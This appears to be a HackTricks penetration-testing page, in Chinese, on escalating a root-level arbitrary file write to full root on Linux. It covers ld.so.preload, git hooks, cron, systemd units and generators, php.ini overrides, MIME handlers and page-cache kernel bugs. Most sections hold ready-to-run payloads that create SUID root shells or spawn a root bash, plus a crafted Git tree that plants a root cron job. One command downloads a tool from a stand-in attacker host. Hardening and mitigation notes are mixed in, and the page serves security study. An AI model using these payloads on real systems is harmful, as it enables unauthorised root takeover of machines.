# 向 Root 任意写入文件

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` 是一个系统范围的共享对象列表，动态链接器会在其他共享对象之前加载这些对象。安全执行模式会对预加载施加额外限制，因此像 `/tmp/pe.so` 这样的库路径并非适用于所有情况的 SUID 二进制文件技术。\
如果你能创建或修改该文件，那么加载该文件的进程会在加载其他共享对象之前加载其中列出的库，从而允许代码在该进程的上下文中执行。<sup>[[12]](#references)</sup>

例如：`echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks** 是在仓库中发生特定事件时运行的可执行脚本，包括 commit 和 merge 操作。如果**特权脚本或用户**执行这些操作，而攻击者能够**写入 `.git` 文件夹**，就可以利用 hook 进行**privilege escalation**。<sup>[[13]](#references)</sup>

例如，可以在 git 仓库的 **`.git/hooks`** 中**生成一个脚本**，使其在每次创建新 commit 时自动执行：

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### 特权 Git tree 导出路径遍历

特权同步器可能会跳过 checkout，而是通过 `git ls-tree` 枚举受攻击者影响的仓库，使用 `git cat-file` 读取每个 blob，将报告的路径名与暂存目录拼接，再自行写入文件。若它同时使用 `-c safe.directory=*`（禁用 Git 对不同所有者仓库的防护），且不检查目标路径是否仍位于指定目录内，就会导致**以同步器权限执行的任意文件写入**。绝对路径形式的 tree 条目名会让 Python 的 `os.path.join(stage, name)` 丢弃 `stage`；包含 `../` 的相对路径名则会在文件系统解析路径时逃逸。由于应用程序直接写入原始 tree，而不是要求 Git 执行 checkout，checkout 阶段的路径名拒绝机制无法保护写入目标。<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

在 root 服务、定时器、部署代理、模板导入器以及备份/恢复任务中，留意以下代码模式：<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

tree 条目编码为 `<mode> SP <name> NUL <raw object ID>`。`git hash-object --literally` 选项有意允许存入普通解析或 `git fsck` 可能拒绝的对象数据，因此可以在临时 clone 中构造一个文件名为绝对目标路径的 tree。此示例会创建一个 cron 文件 blob，将构造的 tree 封装进 commit，并将一个 branch 移至该 commit；但要利用此漏洞，仍需具备更新特权任务所用仓库的权限，且 Git server 必须接受格式错误的对象。<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

加固必须同时覆盖仓库摄取和最终文件系统操作：<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- 将 `safe.directory=*` 替换为服务必须信任的确切仓库，并尽可能以非 root 权限运行仓库处理。
- 在物化文件前拒绝绝对路径名，以及包含任何 `.` 或 `..` 路径分量的名称。拼接路径后，对其进行规范化，并验证目标仍位于预期根目录之下。
- 避免先检查再打开所导致的符号链接竞态：相对于可信目录描述符打开文件；在 Linux 上，对攻击者可控的路径使用 `openat2()`，并设置 `RESOLVE_BENEATH` 和 `RESOLVE_NO_SYMLINKS`。
- 优先在隔离目录中执行常规 checkout，而不是根据 plumbing 输出重新实现 checkout。如果必须摄取原始对象，请启用接收端验证，例如 `receive.fsckObjects=true`；不要降低拒绝经过构造的 tree 所需的、与路径名相关的 `receive.fsck.*` 检查级别。

### 特权配置部署

一些管理服务会将预期的系统状态存入配置文件，之后再以提升后的权限部署。例如，[openmediavault 将配置存储在 `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html)，其 [RPC 接口](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html)可以应用服务变更。如果低权限账户能够写入或替换该文件，请检查它是否也能请求经授权的部署，以及所选模块是否会以 root 身份使用被更改的字段。SSH 账户密钥、计划命令和软件包安装各自有不同的先决条件；仅仅存在某个文件或 XML 文件可写，并不能证明其中任何一种情况成立。检查文件和父目录权限、调用者所属的组及其 RPC 授权、已安装版本，以及实际读取该配置的组件；枚举期间不要编辑配置或调用应用操作。

`/etc/fail2ban/action.d/` 下的 Fail2Ban action 定义是另一个特权配置边界。能够写入并搜索该目录的用户可能可以替换 action 定义或添加覆盖配置，但仅凭目录权限无法确认能够执行代码。请确认已启用的 jail 确实选择了受影响的 action、Fail2Ban 服务以更高权限执行该 action，并且之后会进行经过授权的 reload/restart，且会发生匹配的 ban 事件。只有在某项 sudo 权限适用于确切的服务调用，且更改后的定义会被加载时，重启 Fail2Ban 的无关 sudo 权限才与此有关。[Fail2Ban 的 action 配置](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5)说明了 action 目录与 jail 的关系；其[示例 action](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf)展示了 `actionban` 会在发生 ban 时以服务用户的权限运行。枚举期间只检查权限和生效配置，不要更改 action 或触发 ban。

如果已启用的 Fail2Ban jail 使用了包含 WHOIS 信息的邮件 action，则还存在另一个边界。[CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm)涉及将不可信的 WHOIS 文本通过管道传给 GNU mailutils `mail`，其转义处理可能执行命令。如果低权限用户能够更改**所选 WHOIS 客户端**的服务器覆盖配置文件，就可能影响响应；[Debian 的 `whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html)记录了这样一种文件，但具体路径及其用途因安装环境而异。检查生效的 jail/action、服务身份、实际使用的 WHOIS 客户端及其配置路径、邮件实现、响应是否可控，以及已安装版本是否包含供应商修复或 backport。WHOIS 配置文件可写、Fail2Ban 版本符合条件，或单独存在邮件 action，都不能证明这条利用链成立；被动枚举期间不要查询外部服务器或触发 ban。

### TFTP 文件创建与特权软件包钩子

当可访问的 TFTP 服务以 root 身份运行、将文件系统根目录作为 `--secure` 目录，并启用了 `--create` 时，它可能跨越容器或本地用户边界。[tftpd-hpa 手册](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html)说明了创建选项和用户选项。这可能允许在特权配置目录（包括 `/etc/apt/apt.conf.d/`）中创建新文件；但已有文件仍可能无法被替换。[APT 配置手册](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html)记录了 `APT::Update::Pre-Invoke` 命令。只有当 root 运行的 `apt update` 读取了新配置文件时，它才可能成为拥有更高权限的执行组件。请确认运行中的守护进程实际使用的参数和身份、网络可达性及过滤规则、目标目录的创建策略、APT 的生效配置范围，以及之后是否会发生特权调用。仅凭默认文件、目标目录可写或计划运行的 APT 命令，都不能证明整条利用路径成立。被动排查时只读取有大小限制的本地配置和元数据，不要上传文件或调用 APT。

### Cron 与时间相关文件

如果你能**写入 root 会执行的 cron 相关文件**，通常就能在任务下次运行时获得代码执行。值得关注的目标包括：<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`、`/etc/cron.daily/*`、`/etc/cron.weekly/*`、`/etc/cron.monthly/*`
- `/var/spool/cron/` 或 `/var/spool/cron/crontabs/` 中 root 自己的 crontab
- `systemd` timers 及其触发的服务

快速检查：

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

典型滥用路径：

- **向 `/etc/crontab` 或 `/etc/cron.d/` 中的文件追加新的 root cron job**
- **替换 `run-parts` 已执行的脚本**
- **通过修改现有 timer target 启动的脚本或二进制文件来植入后门**

最简 cron payload 示例：

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

如果你只能在 `run-parts` 使用的 cron 目录中写入，就在该目录中放置一个可执行文件：

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

说明：

- `run-parts` 通常会忽略包含点号的文件名，因此优先使用 `backup` 这样的名称，而不是 `backup.sh`。<sup>[[15]](#references)</sup>
- 有些系统使用 `systemd` timers，而不是经典的 cron，但滥用思路相同：**修改 root 之后将执行的内容**。<sup>[[20]](#references)</sup>

### 服务与套接字文件

如果你可以写入 **`systemd` unit 文件**或这些文件引用的文件，那么通过重新加载并重启该 unit，或者等待服务/套接字激活路径触发，你或许能够以 root 身份执行代码。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

还要检查对系统 unit 目录本身的写入和搜索权限，包括 ACL：即使用户无法读取/列出目录，也可能在 `/etc/systemd/system` 中创建新的 unit。仅有该路径并不会启动任何内容。请确认 system manager 会加载新 unit、调用者对其名称拥有有效的、可获得 root 权限的 `systemctl start` 或 `restart` 授权（或存在其他特权激活路径），并且服务以预期的身份运行。磁盘上已加载的现有 unit 被修改后，可能需要执行 `daemon-reload`；新命名的 unit 则有不同的加载行为。在将通配符重启规则视为充分条件之前，请检查确切的 sudo 参数和排除项。参见 [systemd unit 搜索路径](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html)和 [systemctl 加载及重新加载语义](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html)。

值得关注的目标包括：

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` 中的 Drop-in overrides
- `ExecStart=`、`ExecStartPre=`、`ExecStartPost=` 引用的服务脚本/二进制文件
- root 服务加载的可写 `EnvironmentFile=` 路径

快速检查：

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

常见滥用路径：

- **覆盖**你有权限修改的 root 所有服务单元中的 `ExecStart=`
- **添加 drop-in 覆盖配置**，写入恶意的 `ExecStart=`，并先清除旧值
- **在服务单元已引用的脚本/二进制文件中植入后门**
- **劫持由 socket 激活的服务**：修改对应的 `.service` 文件，该文件会在 socket 收到连接时启动

恶意覆盖配置示例：

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

典型激活流程：

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

如果你无法自行重启服务，但可以编辑由 socket 激活的 unit，那么你可能只需**等待客户端连接**，即可触发被植入后门的服务以 root 身份执行。<sup>[[17]](#references)</sup>

### systemd generator 目录

**系统生成器**是由系统管理器在加载 unit 文件之前启动的可执行文件，启动时和重新加载配置时都会启动。因此，对系统生成器目录（或现有可执行生成器）的写入权限，是一种容易被忽略的 root 代码执行原语，因为审计时往往只检查 `*.service` 和 `*.timer` 文件。<sup>[[35]](#references)[[36]](#references)</sup>

常见的搜索顺序是 `/run/systemd/system-generators/`、`/etc/systemd/system-generators/`、`/usr/local/lib/systemd/system-generators/` 和 `/usr/lib/systemd/system-generators/`（某些发行版通过 `/usr` 合并机制提供 `/lib/systemd/system-generators/`）。较早目录中与后续目录同名的可执行文件会覆盖后者。不要将这些**输入可执行文件目录**与 `/run/systemd/generator`、`/run/systemd/generator.early` 和 `/run/systemd/generator.late` 混淆；后面这些目录包含生成器产生的临时 unit 输出。<sup>[[35]](#references)</sup>

快速检查：

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

新创建的 generator 必须设置可执行位。如果写入原语可以控制字节但不能控制权限模式，则应以现有的可执行 generator 为目标；原地截断通常会保留其元数据。如果目录本身可写，则创建一个新条目并将其标记为可执行。<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

针对 **system** manager 执行 `systemctl daemon-reload` 需要适当的授权，但它会重新运行每个 system generator；否则请等待特权 reload、软件包操作或重启。用户 generator 目录（例如 `~/.config/systemd/user-generators/`）在用户管理器下执行，本身**不会**提供 root 权限。<sup>[[35]](#references)</sup>

进行加固和排查时，应验证每个路径组件及 ACL，而不只是最终的权限位；为 generator 建立哈希和软件包所有权基线，并监控所有 system-generator 输入目录中的创建、重命名、内容或权限更改。监控写入操作非常重要，因为一次性 generator 可能会在执行后自行删除，而 `/run/systemd/generator*` 下生成的 unit 树会在下次 reload 时重建。<sup>[[35]](#references)[[36]](#references)</sup>

### 覆盖特权 PHP 沙箱使用的受限 `php.ini`

某些自定义守护进程会通过运行带有**受限 `php.ini`** 的 `php`（例如 `disable_functions=exec,system,...`）来验证用户提供的 PHP。如果沙箱代码仍具有**任何写入原语**（例如 `file_put_contents`），且你能访问守护进程使用的**确切 `php.ini` 路径**，就可以**覆盖该配置**以解除限制，然后提交第二个 payload，以提升后的权限运行。<sup>[[2]](#references)</sup>

典型流程：

1. 第一个 payload 覆盖沙箱配置。
2. 重新启用危险函数后，第二个 payload 执行代码。

最小示例（替换为守护进程使用的路径）：

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

如果 daemon 以 root 身份运行（或使用 root 所有的路径进行验证），第二次执行时就会获得 root 上下文。如果 sandboxed runtime 仍能写入文件，这本质上就是通过覆盖配置实现的 **privilege escalation**。

### binfmt_misc

`binfmt_misc` 会在 `/proc/sys/fs/binfmt_misc` 下公开注册项；每个注册项都会将一种文件类型模式与一个解释器关联起来。其权限影响取决于谁能更改注册项，以及之后由哪个进程执行匹配的文件，因此在将其视为 privilege-escalation 路径之前，应先确认这些条件。<sup>[[21]](#references)</sup>

如果一个带有 `CAP_DAC_OVERRIDE` 的可执行 helper 接受调用者控制的数据，并将其写入 `/proc/sys/fs/binfmt_misc/register`，那么即使调用者无法直接写入该节点，它也可能成为一条独立的注册路径。枚举期间应检查该 helper 的输入和写入行为，不要执行它。如果注册规则使用 `C` 标志，解释器会获得基于匹配二进制文件的凭据；因此，root 所有的 SUID 匹配文件可能会导致以 root 身份运行调用者控制的解释器。请确认 `binfmt_misc` 的挂载和注册策略、helper 的有效 capability、确切的规则和解释器路径、SUID 目标是否可执行，以及 `no_new_privs` 或 `nosuid` 挂载是否会抑制 SUID 身份转换。仅凭 capability 位或嵌入的路径字符串，只能作为审查线索。<sup>[[21]](#references)</sup> 有关 SUID 抑制条件，请参阅 [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html)。

### 覆盖 schema handlers（如 http: 或 https:）

桌面环境使用 MIME 关联和 desktop entries 来选择 URI scheme 对应的应用程序；如果攻击者可以写入相关的用户配置目录和 desktop-entry 目录，就能将这些 scheme 重定向到自己控制的 launcher。通过修改 `$HOME/.config/mimeapps.list` 文件，将 HTTP 和 HTTPS URL handlers 指向恶意文件（例如 `x-scheme-handler/http=evil.desktop` 和 `x-scheme-handler/https=evil.desktop`），用户点击链接时就可能调用该 desktop entry。<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root 执行用户可写脚本/二进制文件

如果特权工作流运行类似 `/bin/sh /home/username/.../script` 的命令（或运行位于非特权用户所有目录中的任何二进制文件），你就可以劫持它：<sup>[[1]](#references)</sup>

- **检测执行情况：**使用 pspy 监控进程，捕捉 root 调用用户控制路径的情况。<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **确认可写性：**确保目标文件及其目录归你所有且你有写入权限。
- **劫持目标：**备份原始二进制文件/脚本，并放入一个可创建 SUID shell（或执行其他 root 操作）的 payload，然后恢复权限：

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **触发特权操作**（例如，按下会启动 helper 的 UI 按钮）。当 root 重新执行被劫持的路径时，使用 `./rootshell -p` 获取提权后的 shell。

### 仅修改页面缓存中的特权二进制文件

有些内核漏洞不会修改**磁盘上的**文件，而是只允许你修改可读文件的**页面缓存副本**。如果目标是 **setuid** 或以其他方式由 **root 执行**的二进制文件，那么下次执行时可能会运行内存中由攻击者控制的字节，从而提权，即使磁盘上的文件 hash 没有变化。<sup>[[3]](#references)[[4]](#references)</sup>

可以将其视为一种**仅在运行时生效的文件写入原语**：<sup>[[3]](#references)</sup>

- **磁盘保持干净**：inode 和磁盘上的字节不会改变
- **内存被修改**：读取或执行缓存页面的进程会获得攻击者修改后的内容
- **效果是临时的**：重启或缓存被驱逐后，修改就会消失

这种原语介于经典的**任意文件写入**和 Dirty COW / Dirty Pipe 等较早的**页面缓存滥用**漏洞之间：<sup>[[3]](#references)</sup>

- Dirty COW 依赖竞态
- Dirty Pipe 有写入位置限制
- 如果存在漏洞的路径允许直接写入文件映射的缓存页面，那么仅修改页面缓存的原语可能更加可靠

#### 通用提权流程

1. 获取一种能够写入**文件映射的页面缓存页面**的内核原语
2. 将其用于**可读的特权二进制文件**或其他由 root 执行的文件
3. 在页面被逐出缓存**之前**触发执行
4. 在磁盘文件看起来未被修改的情况下，以 root 身份执行代码

通常价值较高的目标：

- **setuid-root** 二进制文件
- **root 服务**启动的 helper
- 通常从**共享宿主机内核/页面缓存的容器**中执行的二进制文件

#### AF_ALG + `splice()` 示例路径

Copy Fail (CVE-2026-31431) 是这类问题的一个典型示例。漏洞路径位于 Linux crypto 用户空间 API（`AF_ALG` / `algif_aead`）中：<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` 可以将可读文件的页面缓存页面引用移入 crypto TX scatterlist
- 原地 `algif_aead` 解密路径会复用源缓冲区和目标缓冲区
- 随后 `authencesn` 会写入目标 tag 区域
- 如果该区域仍引用经 splice 操作得到的文件映射页面，写入就会落入**目标文件的页面缓存**

因此，值得关注的不是 CVE 本身，而是这一模式：

- **将文件映射的缓存页面送入内核子系统**
- 让子系统将其**视为可写的输出**
- 触发一次受控的小范围内存覆盖

公开的 PoC 通过重复进行 **4 字节写入**，在内存中修改 `/usr/bin/su`，然后执行它。<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE 克隆示例路径

DirtyClone (CVE-2026-43503) 展示了同一种**仅修改页面缓存的提权写入**模式的另一种变体，但这次写入点是 **IPsec ESP 解密**，而不是 `AF_ALG`。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

这里的关键技术是**元数据洗白**：

- `splice()` 将一个**只读的文件映射页面缓存页面**放入 ESP-in-UDP 数据包
- 原始的 DirtyFrag 缓解措施会为该 skb 设置 `SKBFL_SHARED_FRAG`，使 `esp_input()` 在解密前**先进行复制**
- netfilter `TEE` 通过 `nf_dup_ipv4()` -> `__pskb_copy_fclone()` 复制数据包
- 克隆会保留**同一个物理页面缓存引用**，但会丢失 `SKBFL_SHARED_FRAG`
- `esp_input()` 随后会认为该克隆是安全的，并对文件映射页面执行**原地 `cbc(aes)` 解密**

给代码审查者的启示比这个 CVE 更广泛：如果某项缓解措施依赖 **skb/页面元数据**来判断操作是否必须先复制，那么任何**保留后备页面但丢弃元数据的克隆/复制路径**，都可能在不易察觉的情况下重新打开写入原语。

典型利用流程：

1. 使用 `unshare(CLONE_NEWUSER | CLONE_NEWNET)`，在私有网络 namespace 中获得 **`CAP_NET_ADMIN`**
2. 启用 loopback，并在 `mangle/OUTPUT` 中安装 **netfilter `TEE` 规则**
3. 通过 `NETLINK_XFRM` 安装 **XFRM ESP transport SA**
4. 将每个目标 4 字节字编码到 SA 的 `seq_hi` 字段中（DirtyFrag 的字选择技巧）
5. 发送经 splice 操作的 ESP-in-UDP 数据包，使 **TEE 克隆**到达 `esp_input()` 并执行**原地解密**
6. 重复此过程，直到 `/usr/bin/su` 或其他特权可执行文件的页面缓存副本中包含攻击者控制的代码

在实际效果上，这与 `AF_ALG` 示例相同：磁盘上的文件保持干净，但 `execve()` 会使用**被修改的页面缓存字节**并获得 root。<sup>[[8]](#references)[[9]](#references)</sup>

此变体的实用暴露面检查：

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

短期内缩小攻击面也需要针对具体路径采取措施：升级到包含 `48f6a5356a33` 的内核可修复 clone 路径；阻止 `xt_TEE` 自动加载可移除 **flag-laundering 步骤**；阻止 `esp4` / `esp6` 可移除 **decrypt sink**。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### 暴露情况与排查

如果怀疑存在此类漏洞，不要只依赖磁盘完整性检查。还要验证：

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

以下配置值可区分某个接口是可加载模块还是内置于内核；crypto 构建规则会将 `CONFIG_CRYPTO_USER_API_AEAD` 映射到 `algif_aead`。<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`：`algif_aead` 可以作为模块加载/卸载
- `CONFIG_CRYPTO_USER_API_AEAD=y`：该接口已内置于内核
- setuid 二进制文件是很好的目标，因为仅修改 page cache 的补丁就可能足以将本地 foothold 提升为 root

#### 缩减 `algif_aead` 路径的攻击面

如果易受攻击的接口由可加载模块提供：<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

如果它被编译进内核，一些披露报告称，可以通过以下方式阻塞 init 路径：<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

这种缓解措施也值得记住，它同样适用于其他 kernel LPE：如果利用依赖某个特定的可选接口，那么禁用或将该接口列入黑名单，即使暂时无法完整升级 kernel，也能切断利用路径。<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo —— 劫持在用户可写 PaperCut 目录中由 root 执行的脚本](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable：Copy Fail (CVE-2026-31431) 常见问题解答](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security 关于 CVE-2026-31431 的披露](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable 修复：crypto: algif_aead - 恢复为非原地操作](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail —— CVE-2026-31431 公告](https://copy.fail/)
- [7] [Theori / Xint 技术分析](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone 仓库 / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog：剖析并利用 Linux LPE 变体 DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux 修复：net: skb: 在 `__pskb_copy_fclone()` 中保留 `SKBFL_SHARED_FRAG` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux 早期缓解措施：为 splice 的 UDP 数据包设置 `SKBFL_SHARED_FRAG` (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) —— Linux 手册页](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) —— Linux 手册页](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) —— Debian 手册页](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc —— Linux Kernel 文档](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME 应用程序关联](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info 规范](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry 规范](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig 语言](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001：Linux kernel AF_ALG page cache 漏洞](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) —— Linux 手册页](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf —— HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` 文档](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` 文档](https://git-scm.com/docs/git-ls-tree)
- [33] [Git 配置文档](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` —— Linux 手册页](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd generator 文档](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs —— Linux Detection Engineering：持久化机制](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
